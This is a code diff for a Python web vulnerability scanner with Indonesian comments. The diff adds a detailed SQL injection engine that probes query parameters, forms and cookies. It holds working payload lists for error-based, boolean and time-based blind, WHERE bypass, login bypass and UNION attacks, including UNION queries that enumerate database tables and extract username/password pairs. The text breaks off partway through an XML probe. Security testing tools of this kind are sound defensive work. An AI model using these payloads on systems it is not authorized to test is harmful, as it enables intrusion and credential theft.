@@ -1646,6 +1646,25 @@ _RAW_CATALOG: dict[str, tuple[str, str, list[tuple[str, str]]]] = {
 _LAB_TAG_SET_OVERRIDES: dict[str, frozenset] = {
     "business_logic-02": frozenset({"business_logic", "negative_quantity"}),
     "business_logic-04": frozenset({"business_logic", "coupon_reuse"}),
+    # SQL injection — satu set tag per skenario, semuanya dapat dibuktikan.
+    "sql_injection-01": frozenset({"sql_injection", "where"}),
+    "sql_injection-02": frozenset({"sql_injection", "login_bypass"}),
+    "sql_injection-03": frozenset({"sql_injection", "oracle", "db_version"}),
+    "sql_injection-04": frozenset({"sql_injection", "mysql_mssql", "db_version"}),
+    "sql_injection-05": frozenset({"sql_injection", "db_dump", "information_schema"}),
+    "sql_injection-06": frozenset({"sql_injection", "db_dump", "oracle", "all_tables"}),
+    "sql_injection-07": frozenset({"sql_injection", "union", "column_count"}),
+    "sql_injection-08": frozenset({"sql_injection", "union", "text_column"}),
+    "sql_injection-09": frozenset({"sql_injection", "union", "other_tables"}),
+    "sql_injection-10": frozenset({"sql_injection", "union", "multi_value"}),
+    "sql_injection-11": frozenset({"sql_injection", "blind", "conditional_responses"}),
+    "sql_injection-12": frozenset({"sql_injection", "blind", "conditional_errors"}),
+    "sql_injection-13": frozenset({"sql_injection", "error_based"}),
+    "sql_injection-14": frozenset({"sql_injection", "blind", "time_based"}),
+    "sql_injection-15": frozenset({"sql_injection", "blind", "time_based"}),
+    "sql_injection-16": frozenset({"sql_injection", "oob"}),
+    "sql_injection-17": frozenset({"sql_injection", "oob"}),
+    "sql_injection-18": frozenset({"sql_injection", "xml_encoded"}),
 }
 
 
@@ -1973,8 +1992,8 @@ def applicability(ctx: TargetContext) -> dict[str, tuple[bool, str]]:
     """Apakah keluarga probe layak dijalankan pada target INI?"""
     a: dict[str, tuple[bool, str]] = {}
 
-    a["sqli"] = (bool(ctx.params) or _has_text_input(ctx),
-                 "tidak ada parameter/input yang bisa diuji")
+    a["sqli"] = (bool(ctx.params) or _has_text_input(ctx) or bool(ctx.cookies),
+                 "tidak ada parameter/input/cookie yang bisa diuji")
     a["nosql"] = (_has_json_api(ctx) or _has_login_form(ctx),
                   "tidak ada endpoint JSON/login untuk operator NoSQL")
     a["xss"] = (bool(ctx.params) or _has_post_form(ctx) or bool(ctx.js_text),
@@ -3249,122 +3268,746 @@ def a_reflection(ctx):
 # ══════════════════════════════════════════════════════════════════════════════
 # SQL injection
 # ══════════════════════════════════════════════════════════════════════════════
-@active("sqli")
-def a_sqli_error(ctx):
-    base, base_len, _ = _baseline(ctx)
-    if base is None:
-        return []
-    for name in list(ctx.params)[:8]:
-        for payload in ("'", "\"", "')", "'-- -"):
-            resp = _request(ctx, _with_param(ctx.url, name, payload))
-            if resp is None:
-                continue
-            low = (resp.text or "").lower()
-            for dbms, sig in SQL_ERROR_SIGNATURES:
-                if sig in low:
-                    return [make_finding(
-                        ctx, "sqli", {"sql_injection", "error_based"},
-                        type_=f"Error-based SQL injection pada parameter '{name}'",
-                        severity="high",
-                        evidence=(f"Payload {payload!r} memicu error SQL ({dbms}) pada respons "
-                                  f"HTTP {resp.status_code}: \"{_snip(resp.text, sig)}\""),
-                        risk="Input masuk ke query SQL; data dapat dibaca/diubah.",
-                        recommendation="Gunakan parameterized query dan matikan detail error.",
-                        verification="active_sqli_error_signature",
-                    )]
-    return []
+# ══════════════════════════════════════════════════════════════════════════════
+# SQL injection — mesin skenario mendalam
+#
+# Cakupan: error-based (termasuk CAST/tipe), boolean blind, conditional error,
+# time-based (PostgreSQL/MySQL/MSSQL/Oracle), WHERE/hidden data, UNION (hitung
+# kolom, kolom teks, versi DBMS, enumerasi tabel, ambil kredensial tabel lain,
+# gabung multi-nilai dalam satu kolom), login bypass, XML/filter bypass, dan
+# out-of-band (butuh collaborator/DNS milik penguji).
+# ══════════════════════════════════════════════════════════════════════════════
+SQLI_TIME_DELAY = float(os.getenv("SATRIA_SQLI_TIME_DELAY", "4"))
+SQLI_TIME_MARGIN = 2.0
+SQLI_MAX_REQUESTS = int(os.getenv("SATRIA_SQLI_MAX_REQUESTS", "240"))
+SQLI_MAX_POINTS = int(os.getenv("SATRIA_SQLI_MAX_POINTS", "8"))
+SQLI_OAST_DOMAIN = (os.getenv("SATRIA_SQLI_OAST_DOMAIN") or "").strip().lower().strip(".")
+SQLI_OAST_API = (os.getenv("SATRIA_SQLI_OAST_API") or "").strip()
+
+SQLI_DBMS_TAGS = {"oracle": "oracle", "mysql": "mysql_mssql", "mssql": "mysql_mssql"}
+
+# Anggaran request per host, dipakai bersama oleh semua halaman hasil discovery
+# agar pemindaian SQL tidak meledak pada situs dengan banyak parameter.
+_SQLI_HOST_BUDGET: dict[str, int] = {}
+_SQLI_TIME_HOSTS: set[str] = set()
 
 
-@active("sqli")
-def a_sqli_boolean(ctx):
-    base, base_len, base_text = _baseline(ctx)
-    if base is None:
-        return []
-    for name in list(ctx.params)[:8]:
-        pairs = [("' AND '1'='1", "' AND '1'='2"),
-                 ("1 AND 1=1", "1 AND 1=2")]
-        for true_p, false_p in pairs:
-            r_true = _request(ctx, _with_param(ctx.url, name, true_p))
-            r_false = _request(ctx, _with_param(ctx.url, name, false_p))
-            if not r_true or not r_false:
-                continue
-            if r_true.status_code != r_false.status_code:
-                continue
-            diff = abs(len(r_true.content) - len(r_false.content))
-            if diff >= max(20, int(base_len * 0.10)) and b"error" not in r_false.content.lower():
-                return [make_finding(
-                    ctx, "sqli", {"sql_injection", "blind"},
-                    type_=f"Blind SQL injection (boolean) pada parameter '{name}'",
-                    severity="high",
-                    evidence=(f"Kondisi TRUE menghasilkan {len(r_true.content)} byte, FALSE "
-                              f"{len(r_false.content)} byte (selisih {diff} byte) pada parameter '{name}'."),
-                    risk="Penyerang dapat mengekstrak data bit-per-bit lewat perbedaan respons.",
-                    recommendation="Gunakan parameterized query dan samakan respons error.",
-                    verification="active_sqli_boolean_differential",
-                )]
-    return []
+def _sqli_budget_key(ctx) -> str:
+    parsed = urlparse(ctx.url)
+    return (parsed.netloc or ctx.host).lower()
 
 
-@active("sqli")
-def a_sqli_time(ctx):
-    base, _, _ = _baseline(ctx)
-    if base is None:
-        return []
-    for name in list(ctx.params)[:6]:
-        t0 = time.time()
-        r0 = _request(ctx, _with_param(ctx.url, name, "1"))
-        baseline = time.time() - t0
-        if r0 is None:
+def _sqli_take(ctx, n: int = 1) -> bool:
+    key = _sqli_budget_key(ctx)
+    left = _SQLI_HOST_BUDGET.setdefault(key, SQLI_MAX_REQUESTS)
+    if left < n:
+        return False
+    _SQLI_HOST_BUDGET[key] = left - n
+    return True
+
+
+def _sqli_http(sess, ctx, method, url, *, data=None, headers=None, cookies=None):
+    if not _sqli_take(ctx):
+        return None
+    t0 = time.time()
+    try:
+        resp = sess.request(
+            method, url, data=data, cookies=cookies,
+            headers={"User-Agent": UA, **(headers or {})},
+            timeout=ACTIVE_TIMEOUT, allow_redirects=False,
+        )
+    except Exception as exc:
+        ctx.http_log.append({"method": method, "url": url, "error": str(exc)[:140], "phase": "sqli"})
+        return None
+    elapsed = time.time() - t0
+    try:
+        resp._satria_elapsed = elapsed
+    except Exception:
+        pass
+    ctx.http_log.append({"method": method, "url": url, "status": resp.status_code,
+                         "len": len(resp.content), "elapsed": round(elapsed, 2), "phase": "sqli"})
+    return resp
+
+
+def _sqli_body(resp) -> str:
+    if resp is None:
+        return ""
+    try:
+        return resp.text or ""
+    except Exception:
+        return ""
+
+
+def _sqli_len(resp) -> int:
+    if resp is None:
+        return 0
+    try:
+        return len(resp.content)
+    except Exception:
+        return 0
+
+
+def _sqli_elapsed(resp) -> float:
+    return float(getattr(resp, "_satria_elapsed", 0.0))
+
+
+def _sqli_dbms(resp):
+    low = _sqli_body(resp).lower()
+    for dbms, sig in SQL_ERROR_SIGNATURES:
+        if sig in low:
+            return dbms, sig
+    return "", ""
+
+
+DB_VERSION_RE = re.compile(
+    r"(postgresql\s+\d[\w.]*|mysql\s+\d[\w.]*|mariadb\s+[\d.]+|"
+    r"microsoft sql server\s+\d{4}[^<\s]*|oracle[^<\n]{0,40}\d[\d.]{2,}|"
+    r"\b(?:\d{1,2}\.\d{1,2}\.\d{1,3}(?:[-.][\w.]+)?)\b)", re.I)
+SQLI_TABLE_RE = re.compile(r"CANARY([A-Za-z0-9_]{2,40})")
+SQLI_CRED_RE = re.compile(r"CANARY([A-Za-z0-9_.@-]{1,40})~([A-Za-z0-9$./=+_-]{6,80})")
+SQLI_DESTRUCTIVE = re.compile(
+    r"(?:^|/)(?:logout|log-out|signout|sign-out|delete|remove|checkout|payment|"
+    r"purchase|transfer|admin|unsubscribe)(?:/|$)", re.I)
+
+
+def _sqli_finding(ctx, tags, type_, severity, evidence, verification, confidence="confirmed"):
+    return make_finding(
+        ctx, "sqli", set(tags) | {"sql_injection"}, type_=type_, severity=severity,
+        evidence=evidence,
+        risk="Input klien masuk ke query SQL tanpa parameterisasi; penyerang dapat membaca, "
+             "mengubah, atau menghapus data serta melewati autentikasi.",
+        recommendation="Gunakan parameterized query/prepared statement, validasi tipe input, "
+                       "batasi hak akses akun database, dan matikan detail error di production.",
+        verification=verification, confidence=confidence,
+    )
+
+
+# ── injection points ─────────────────────────────────────────────────────────
+def _sqli_cookie_items(ctx):
+    out = []
+    for cookie in ctx.cookies or []:
+        if isinstance(cookie, dict):
+            name = str(cookie.get("name") or "").strip()
+            value = str(cookie.get("value") or "")
+        else:
+            name, _, value = str(cookie).partition("=")
+            name = name.strip()
+        if name and len(value) <= 200:
+            out.append((name, value))
+    return out
+
+
+def _sqli_form_fields(form):
+    fields = []
+    for item in form.get("inputs") or []:
+        name = str(item.get("name") or "").strip()
+        if not name:
             continue
-        for payload in ("'||(SELECT pg_sleep(4))||'", "1' AND (SELECT 1 FROM pg_sleep(4))-- -",
-                        "1' AND SLEEP(4)-- -", "';WAITFOR DELAY '0:0:4'-- -"):
-            t0 = time.time()
-            resp = _request(ctx, _with_param(ctx.url, name, payload))
-            elapsed = time.time() - t0
-            if resp is not None and elapsed >= baseline + 3.0:
-                return [make_finding(
-                    ctx, "sqli", {"sql_injection", "blind", "time_based"},
-                    type_=f"Blind SQL injection berbasis waktu pada parameter '{name}'",
-                    severity="high",
-                    evidence=(f"Payload {payload!r} menambah waktu respons menjadi {elapsed:.1f}s "
-                              f"(baseline {baseline:.1f}s)."),
-                    risk="Data dapat diekstrak lewat delay terkontrol.",
-                    recommendation="Gunakan parameterized query; batasi waktu eksekusi query.",
-                    verification="active_sqli_time_delay",
-                )]
-    return []
-
-
-@active("sqli")
-def a_sqli_union(ctx):
-    base, base_len, _ = _baseline(ctx)
-    if base is None:
-        return []
-    for name in list(ctx.params)[:6]:
-        columns = 0
-        for n in range(1, 7):
-            resp = _request(ctx, _with_param(ctx.url, name, f"1' ORDER BY {n}-- -"))
-            if resp is None:
-                break
-            if resp.status_code >= 500 or len(resp.content) < base_len * 0.5:
-                columns = n - 1
-                break
-        if columns <= 0:
+        typ = str(item.get("type") or "").lower()
+        if typ in ("submit", "button", "image", "file", "reset", "checkbox", "radio"):
             continue
-        payload = "1' UNION SELECT " + ",".join([f"'{CANARY}{i}'" for i in range(1, columns + 1)]) + "-- -"
-        resp = _request(ctx, _with_param(ctx.url, name, payload))
-        if resp is not None and CANARY in (resp.text or ""):
-            return [make_finding(
-                ctx, "sqli", {"sql_injection", "union"},
-                type_=f"UNION-based SQL injection terkonfirmasi ({columns} kolom)",
-                severity="high",
-                evidence=(f"ORDER BY menentukan {columns} kolom; payload UNION menempatkan canary "
-                          f"{CANARY} ke respons."),
-                risk="Penyerang dapat membaca tabel lain lewat UNION SELECT.",
-                recommendation="Gunakan parameterized query dan batasi hak akses DB.",
-                verification="active_sqli_union_canary",
-            )]
-    return []
+        fields.append((name, str(item.get("value") or ""), typ))
+    return fields
+
+
+def _sqli_points(ctx):
+    points = []
+    for name, values in list(ctx.params.items())[:6]:
+        points.append({"kind": "query", "name": name, "method": "GET", "url": ctx.url,
+                       "value": (values[0] if values else "1"),
+                       "label": f"parameter GET '{name}'"})
+    for form in ctx.forms or []:
+        method = str(form.get("method") or "get").lower()
+        if method not in ("get", "post"):
+            continue
+        action = ctx.abs_url(str(form.get("action") or ctx.url))
+        if urlparse(action).netloc.lower() != urlparse(ctx.url).netloc.lower():
+            continue
+        if SQLI_DESTRUCTIVE.search(urlparse(action).path or ""):
+            continue
+        if any(str(i.get("type") or "").lower() == "password" for i in form.get("inputs") or []):
+            continue  # form login ditangani probe login bypass
+        fields = _sqli_form_fields(form)
+        if not fields:
+            continue
+        for name, value, _typ in fields[:5]:
+            points.append({"kind": "form", "name": name, "method": method.upper(),
+                           "url": action, "fields": fields, "value": value,
+                           "label": f"field form '{name}'"})
+    for name, value in _sqli_cookie_items(ctx)[:4]:
+        points.append({"kind": "cookie", "name": name, "method": "GET", "url": ctx.url,
+                       "value": value, "label": f"cookie '{name}'"})
+    seen, out = set(), []
+    for point in points:
+        key = (point["kind"], point["name"], point["url"])
+        if key in seen:
+            continue
+        seen.add(key)
+        out.append(point)
+    return out[:SQLI_MAX_POINTS]
+
+
+def _sqli_value(point, suffix: str) -> str:
+    """Payload selalu DITAMBAHKAN pada nilai asli parameter.
+
+    Mengganti nilai asli (mis. `category=Gifts` menjadi `'`) membuat klausa WHERE
+    kehilangan konteksnya sehingga perbandingan TRUE/FALSE tidak lagi sebanding
+    dengan baseline.
+    """
+    original = str(point.get("value") or "1")
+    if not original:
+        original = "1"
+    return f"{original}{suffix}"
+
+
+def _sqli_send(sess, ctx, point, value):
+    if point["kind"] == "query":
+        return _sqli_http(sess, ctx, "GET", _with_param(point["url"], point["name"], value))
+    if point["kind"] == "form":
+        data = {name: val for name, val, _typ in point["fields"]}
+        data[point["name"]] = value
+        return _sqli_http(sess, ctx, point["method"], point["url"], data=data)
+    if point["kind"] == "cookie":
+        cookies = dict(sess.cookies)
+        cookies[point["name"]] = value
+        return _sqli_http(sess, ctx, "GET", point["url"], cookies=cookies)
+    return None
+
+
+# ── 1. error-based ───────────────────────────────────────────────────────────
+SQLI_ERROR_PAYLOADS = ["'", "\"", "')", "';", "'-- -", "\\",
+                       "' AND 1=CAST(1 AS int)--", "'||'", "1'"]
+
+
+def _sqli_error_phase(sess, ctx, point, base, out):
+    base_dbms = _sqli_dbms(base)[0]
+    for payload in SQLI_ERROR_PAYLOADS:
+        resp = _sqli_send(sess, ctx, point, _sqli_value(point, payload))
+        if resp is None:
+            return
+        dbms, sig = _sqli_dbms(resp)
+        if not dbms or dbms == base_dbms:
+            continue
+        tags = {"error_based"} | ({SQLI_DBMS_TAGS[dbms]} if dbms in SQLI_DBMS_TAGS else set())
+        out.append(_sqli_finding(
+            ctx, tags, f"Error-based SQL injection pada {point['label']}", "high",
+            f"Payload {payload!r} memicu error {dbms.upper()} (frasa \"{sig}\") pada HTTP "
+            f"{resp.status_code}: \"{_snip(_sqli_body(resp), sig)}\"",
+            "active_sqli_error_signature"))
+        return
+
+
+# ── 2. boolean blind ────────────────────────────────────────────────────────
+SQLI_BOOLEAN_PAIRS = [
+    ("' AND '1'='1", "' AND '1'='2"),
+    ("' AND 1=1-- -", "' AND 1=2-- -"),
+    ("1 AND 1=1", "1 AND 1=2"),
+    ("1 AND 1=1-- -", "1 AND 1=2-- -"),
+    ("' AND 'a'='a", "' AND 'a'='b"),
+]
+
+
+def _sqli_bool_ok(base, resp_true, resp_false) -> bool:
+    if resp_true is None or resp_false is None:
+        return False
+    if resp_true.status_code != resp_false.status_code:
+        return False
+    base_len = _sqli_len(base)
+    len_true, len_false = _sqli_len(resp_true), _sqli_len(resp_false)
+    if abs(len_true - len_false) < max(25, int(base_len * 0.05)):
+        return False
+    # Kondisi TRUE harus mengembalikan halaman normal (mirip baseline).
+    if base_len and abs(len_true - base_len) > max(60, int(base_len * 0.30)):
+        return False
+    if _sqli_dbms(resp_true)[0] or _sqli_dbms(resp_false)[0]:
+        return False
+    return True
+
+
+def _sqli_boolean_phase(sess, ctx, point, base, out):
+    for true_payload, false_payload in SQLI_BOOLEAN_PAIRS:
+        hits = 0
+        len_true = len_false = 0
+        for _ in range(2):
+            resp_true = _sqli_send(sess, ctx, point, _sqli_value(point, true_payload))
+            resp_false = _sqli_send(sess, ctx, point, _sqli_value(point, false_payload))
+            if _sqli_bool_ok(base, resp_true, resp_false):
+                hits += 1
+                len_true, len_false = _sqli_len(resp_true), _sqli_len(resp_false)
+        if hits == 2:
+            out.append(_sqli_finding(
+                ctx, {"blind", "conditional_responses"},
+                f"Blind SQL injection (respons kondisional) pada {point['label']}", "high",
+                f"Payload TRUE {true_payload!r} mengembalikan {len_true} byte (normal) sedangkan "
+                f"payload FALSE {false_payload!r} mengembalikan {len_false} byte; pola ini "
+                "berulang pada dua percobaan.",
+                "active_sqli_boolean_differential"))
+            return
+
+
+# ── 3. conditional error ────────────────────────────────────────────────────
+SQLI_COND_ERROR_PAIRS = [
+    ("' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a",
+     "' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a"),
+    ("1 AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 1 END)=1",
+     "1 AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 1 END)=1"),
+    ("' AND 1=(SELECT CASE WHEN (1=1) THEN CAST('x' AS int) ELSE 1 END)-- -",
+     "' AND 1=(SELECT CASE WHEN (1=2) THEN CAST('x' AS int) ELSE 1 END)-- -"),
+]
+
+
+def _sqli_cond_error_phase(sess, ctx, point, base, out):
+    base_status = base.status_code if base is not None else 0
+    for true_payload, false_payload in SQLI_COND_ERROR_PAIRS:
+        resp_true = _sqli_send(sess, ctx, point, _sqli_value(point, true_payload))
+        resp_false = _sqli_send(sess, ctx, point, _sqli_value(point, false_payload))
+        if resp_true is None or resp_false is None:
+            return
+        true_error = resp_true.status_code >= 500 or bool(_sqli_dbms(resp_true)[0])
+        false_ok = resp_false.status_code == base_status and not _sqli_dbms(resp_false)[0]
+        if true_error and false_ok:
+            out.append(_sqli_finding(
+                ctx, {"blind", "conditional_errors"},
+                f"Blind SQL injection (error kondisional) pada {point['label']}", "high",
+                f"Payload TRUE {true_payload!r} menghasilkan HTTP {resp_true.status_code} "
+                f"(error), payload FALSE {false_payload!r} menghasilkan HTTP "
+                f"{resp_false.status_code} seperti baseline.",
+                "active_sqli_conditional_error"))
+            return
+
+
+# ── 4. time-based ───────────────────────────────────────────────────────────
+SQLI_TIME_PAYLOADS = [
+    ("postgresql", "'||(SELECT pg_sleep({d}))||'"),
+    ("postgresql", "' AND (SELECT 1 FROM pg_sleep({d}))-- -"),
+    ("postgresql", "';SELECT pg_sleep({d})-- -"),
+    ("mysql", "' AND SLEEP({d})-- -"),
+    ("mysql", "' AND SLEEP({d})#"),
+    ("mysql", "'||SLEEP({d})||'"),
+    ("mssql", "';WAITFOR DELAY '0:0:{d}'-- -"),
+    ("mssql", "1;WAITFOR DELAY '0:0:{d}'--"),
+    ("oracle", "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',{d})--"),
+    ("oracle", "'||(SELECT dbms_pipe.receive_message(('a'),{d}) FROM dual)||'"),
+]
+
+
+def _sqli_time_phase(sess, ctx, point, base, out):
+    delay = int(max(2, round(SQLI_TIME_DELAY)))
+    probe = _sqli_send(sess, ctx, point, str(point.get("value") or "1"))
+    baseline = _sqli_elapsed(probe) if probe is not None else _sqli_elapsed(base)
+    if baseline <= 0 or baseline > 2.5:
+        return
+    threshold = baseline + max(SQLI_TIME_MARGIN, delay * 0.6)
+    for dbms, template in SQLI_TIME_PAYLOADS:
+        if not _sqli_take(ctx, 2):
+            return
+        payload = _sqli_value(point, template.format(d=delay))
+        first = _sqli_send(sess, ctx, point, payload)
+        if first is None:
+            continue
+        t1 = _sqli_elapsed(first)
+        if t1 < threshold:
+            continue
+        second = _sqli_send(sess, ctx, point, payload)
+        if second is None or _sqli_elapsed(second) < threshold:
+            continue
+        tags = {"blind", "time_based"} | ({SQLI_DBMS_TAGS[dbms]} if dbms in SQLI_DBMS_TAGS else set())
+        out.append(_sqli_finding(
+            ctx, tags, f"Blind SQL injection berbasis waktu pada {point['label']}", "high",
+            f"Payload {payload!r} konsisten menambah waktu respons menjadi "
+            f"{t1:.1f}s dan {_sqli_elapsed(second):.1f}s (baseline {baseline:.1f}s).",
+            "active_sqli_time_delay"))
+        return
+
+
+# ── 5. WHERE clause / hidden data ───────────────────────────────────────────
+SQLI_WHERE_PAIRS = [
+    ("' OR 1=1-- -", "' OR 1=2-- -"),
+    ("1 OR 1=1-- -", "1 OR 1=2-- -"),
+    ("' OR '1'='1", "' OR '1'='2"),
+    ("' OR 1=1#", "' OR 1=2#"),
+]
+
+
+def _sqli_where_phase(sess, ctx, point, base, out):
+    base_len = _sqli_len(base)
+    if base_len <= 0:
+        return
+    for true_payload, false_payload in SQLI_WHERE_PAIRS:
+        resp_true = _sqli_send(sess, ctx, point, _sqli_value(point, true_payload))
+        resp_false = _sqli_send(sess, ctx, point, _sqli_value(point, false_payload))
+        if resp_true is None or resp_false is None:
+            return
+        if resp_true.status_code >= 500 or resp_true.status_code != base.status_code:
+            continue
+        growth_true = _sqli_len(resp_true) - base_len
+        growth_false = _sqli_len(resp_false) - base_len
+        if growth_true < max(100, int(base_len * 0.10)):
+            continue
+        if growth_false > growth_true * 0.30:
+            continue
+        out.append(_sqli_finding(
+            ctx, {"where"},
+            f"Injeksi SQL pada klausa WHERE — data tersembunyi terungkap ({point['label']})",
+            "high",
+            f"Payload {true_payload!r} menambah ukuran respons {growth_true} byte "
+            f"({base_len} → {_sqli_len(resp_true)}), sedangkan kontrol {false_payload!r} "
+            f"hanya {growth_false:+d} byte: filter WHERE berhasil dilewati.",
+            "active_sqli_where_hidden_data"))
+        return
+
+
+# ── 6. UNION: kolom, kolom teks, versi, enumerasi, kredensial ──────────────
+def _sqli_union_payload(point, columns, index, expr, suffix=""):
+    values = ["NULL"] * columns
+    values[index] = expr
+    return _sqli_value(point, "' UNION SELECT " + ",".join(values) + suffix + "-- -")
+
+
+def _sqli_union_phase(sess, ctx, point, base, out):
+    columns = 0
+    for n in range(1, 9):
+        resp = _sqli_send(sess, ctx, point, _sqli_value(point, f"' ORDER BY {n}-- -"))
+        if resp is None:
+            return
+        sql_error = bool(_sqli_dbms(resp)[0]) or (
+            resp.status_code >= 500 and b"error" in resp.content.lower())
+        if sql_error:
+            # Kolom terbukti hanya bila penambahan indeks ORDER BY memicu error
+            # SQL yang spesifik; aplikasi non-SQL yang sekadar mengembalikan
+            # halaman kosong tidak boleh dianggap memiliki N kolom.
+            columns = n - 1
+            break
+    if columns <= 0:
+        return
+
+    # Kolom yang dapat memuat teks (canary harus muncul di respons).
+    text_index = -1
+    for index in range(columns):
+        payload = _sqli_union_payload(point, columns, index, f"'{CANARY}'")
+        resp = _sqli_send(sess, ctx, point, payload)
+        if resp is None:
+            return
+        if CANARY in _sqli_body(resp):
+            text_index = index
+            break
+
+    base_body = _sqli_body(base)
+    if text_index >= 0:
+        # a) versi DBMS
+        version_specs = [
+            ("postgresql", "version()", ""),
+            ("mysql", "@@version", ""),
+            ("mssql", "@@version", ""),
+            ("oracle", "banner", " FROM v$version"),
+        ]
+        for dbms, expr, suffix in version_specs:
+            payload = _sqli_union_payload(point, columns, text_index, expr, suffix)
+            resp = _sqli_send(sess, ctx, point, payload)
+            if resp is None:
+                return
+            match = DB_VERSION_RE.search(_sqli_body(resp))
+            if match and match.group(0).lower() not in base_body.lower():
+                tags = {"union", "db_version"}
+                if dbms in SQLI_DBMS_TAGS:
+                    tags.add(SQLI_DBMS_TAGS[dbms])
+                out.append(_sqli_finding(
+                    ctx, tags,
+                    f"UNION-based SQL injection — versi DBMS ({dbms}) terbaca "
+                    f"pada {point['label']}", "high",
+                    f"{columns} kolom ditentukan (ORDER BY/UNION NULL); payload {payload!r} "
+                    f"mengembalikan penanda versi {match.group(0)!r}.",
+                    "active_sqli_union_version"))
+                return
+
+        # b) enumerasi tabel (information_schema / all_tables)
+        dump_specs = [
+            ("postgresql", "'CANARY'||table_name", " FROM information_schema.tables", "information_schema"),
+            ("mysql", "CONCAT('CANARY',table_name)", " FROM information_schema.tables", "information_schema"),
+            ("mssql", "'CANARY'+table_name", " FROM information_schema.tables", "information_schema"),
+            ("oracle", "'CANARY'||table_name", " FROM all_tables", "all_tables"),
+        ]
+        for dbms, expr, suffix, dump_tag in dump_specs:
+            payload = _sqli_union_payload(point, columns, text_index, expr, suffix)
+            resp = _sqli_send(sess, ctx, point, payload)
+            if resp is None:
+                return
+            names = [m.group(1) for m in SQLI_TABLE_RE.finditer(_sqli_body(resp))]
+            if names:
+                tags = {"union", "db_dump", dump_tag}
+                if dbms in SQLI_DBMS_TAGS:
+                    tags.add(SQLI_DBMS_TAGS[dbms])
+                out.append(_sqli_finding(
+                    ctx, tags,
+                    f"UNION-based SQL injection — enumerasi tabel database ({dbms}) "
+                    f"pada {point['label']}", "high",
+                    f"Payload {payload!r} mengembalikan nama tabel: "
+                    f"{', '.join(dict.fromkeys(names))[:300]}.",
+                    "active_sqli_union_db_dump"))
+                return
+
+        # c) kredensial dari tabel lain (users)
+        cred_specs = [
+            ("postgresql", "'CANARY'||username||'~'||password", " FROM users"),
+            ("mysql", "CONCAT('CANARY',username,'~',password)", " FROM users"),
+            ("mssql", "'CANARY'+username+'~'+password", " FROM users"),
+            ("oracle", "'CANARY'||username||'~'||password", " FROM users"),
+        ]
+        for dbms, expr, suffix in cred_specs:
+            payload = _sqli_union_payload(point, columns, text_index, expr, suffix)
+            resp = _sqli_send(sess, ctx, point, payload)
+            if resp is None:
+                return
+            match = SQLI_CRED_RE.search(_sqli_body(resp))
+            if match:
+                tag = "multi_value" if columns == 1 else "other_tables"
+                out.append(_sqli_finding(
+                    ctx, {"union", tag},
+                    f"UNION-based SQL injection — data tabel lain terbaca ({dbms}) "
+                    f"pada {point['label']}", "high",
+                    f"{columns} kolom; payload {payload!r} mengembalikan pasangan "
+                    f"kredensial '{match.group(1)}' / hash sepanjang {len(match.group(2))} karakter.",
+                    "active_sqli_union_credentials"))
+                return
+
+        out.append(_sqli_finding(
+            ctx, {"union", "text_column"},
+            f"UNION-based SQL injection — kolom teks ditemukan pada {point['label']}", "high",
+            f"Query mengembalikan {columns} kolom dan canary {CANARY!r} berhasil "
+            "ditempatkan pada salah satu kolom teks respons.",
+            "active_sqli_union_text_column"))
+        return
+
+    out.append(_sqli_finding(
+        ctx, {"union", "column_count"},
+        f"UNION-based SQL injection — jumlah kolom query ({columns}) pada "
+        f"{point['label']}", "high",
+        f"ORDER BY/UNION NULL menentukan query mengembalikan {columns} kolom, "
+        "sehingga UNION SELECT dapat disusun.",
+        "active_sqli_union_column_count"))
+
+
+# ── 7. login bypass ─────────────────────────────────────────────────────────
+SQLI_LOGIN_PAYLOADS = ["' OR 1=1-- -", "' OR '1'='1", "administrator'-- -",
+                       "admin' OR '1'='1'-- -", "' OR 1=1#"]
+SQLI_LOGIN_SUCCESS = ("log out", "logout", "sign out", "my account", "your username is",
+                      "update email", "account details")
+
+
+def _sqli_login_success(resp) -> bool:
+    if resp is None:
+        return False
+    if resp.status_code in (301, 302, 303, 307, 308):
+        location = str(resp.headers.get("Location", "")).lower()
+        return bool(location) and "login" not in location and "error" not in location
+    body = _sqli_body(resp).lower()
+    return any(marker in body for marker in SQLI_LOGIN_SUCCESS)
+
+
+def _sqli_login_phase(sess, ctx, out):
+    for form in ctx.forms or []:
+        inputs = form.get("inputs") or []
+        if not any(str(i.get("type") or "").lower() == "password" for i in inputs):
+            continue
+        action = ctx.abs_url(str(form.get("action") or ctx.url))
+        if urlparse(action).netloc.lower() != urlparse(ctx.url).netloc.lower():
+            continue
+        fields = [(name, value) for name, value, _typ in _sqli_form_fields(form)]
+        if not fields:
+            continue
+        user_field = next((n for n, _v in fields if re.search(r"(user|email|login|name)", n, re.I)),
+                          fields[0][0])
+        pass_field = next((n for n, _v in fields if re.search(r"pass", n, re.I)), None)
+        data = {name: value for name, value in fields}
+        if pass_field:
+            data[pass_field] = "satria-probe-password"
+        data[user_field] = "satria_probe_user"
+        baseline = _sqli_http(sess, ctx, "POST", action, data=data)
+        if baseline is None or _sqli_login_success(baseline):
+            continue
+        for payload in SQLI_LOGIN_PAYLOADS:
+            attempt = dict(data)
+            attempt[user_field] = payload
+            resp = _sqli_http(sess, ctx, "POST", action, data=attempt)
+            if resp is None:
+                return
+            if _sqli_login_success(resp):
+                out.append(_sqli_finding(
+                    ctx, {"login_bypass"},
+                    f"SQL injection — login bypass pada form '{user_field}' ({action})", "critical",
+                    f"Kredensial salah ditolak, tetapi username {payload!r} menghasilkan HTTP "
+                    f"{resp.status_code} dengan sesi terautentikasi "
+                    f"(Location={resp.headers.get('Location', '-')!r}).",
+                    "active_sqli_login_bypass"))
+                return
+
+
+# ── 8. XML / filter bypass via entity encoding ──────────────────────────────
+def _sqli_xml_endpoints(ctx):
+    js = ctx.js_text or ""
+    if not re.search(r"<(stockCheck|productId|storeId|checkStock|soap)", js + (ctx.html or ""), re.I):
+        return []
+    origin = urlparse(ctx.url).netloc.lower()
+    found = []
+    for match in re.finditer(r"""(?:fetch|axios\.post|\.open)\s*\(\s*['"]([^'"]{1,200})['"]""", js):
+        url = ctx.abs_url(match.group(1))
+        if urlparse(url).netloc.lower() != origin:
+            continue
+        if re.search(r"(stock|xml|soap|inventory|check)", url, re.I):
+            found.append(url)
+    return list(dict.fromkeys(found))[:2]
+
+
+def _sqli_xml_phase(sess, ctx, out):
+    endpoints = _sqli_xml_endpoints(ctx)
+    if not endpoints:
+        return
